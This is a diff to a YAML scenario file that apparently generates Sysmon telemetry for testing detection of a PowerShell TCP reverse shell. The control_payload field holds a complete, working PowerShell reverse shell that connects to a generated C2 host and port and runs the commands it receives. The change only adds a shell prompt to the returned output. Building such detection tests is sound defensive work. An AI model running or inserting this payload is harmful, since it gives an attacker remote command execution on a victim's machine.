@@ -25,7 +25,7 @@ state:
   c2_host:            gen.ipv4()
   c2_port:            gen.port()
   control_payload: |-
-    $client = New-Object System.Net.Sockets.TCPClient('${ref.c2_host}',${ref.c2_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = ([text.encoding]::ASCII).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+    $client = New-Object System.Net.Sockets.TCPClient('${ref.c2_host}',${ref.c2_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = ([text.encoding]::ASCII).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 workloads:
   - scenario: scenarios/windows/sysmon/process-create/powershell-tcp-reverse-shell
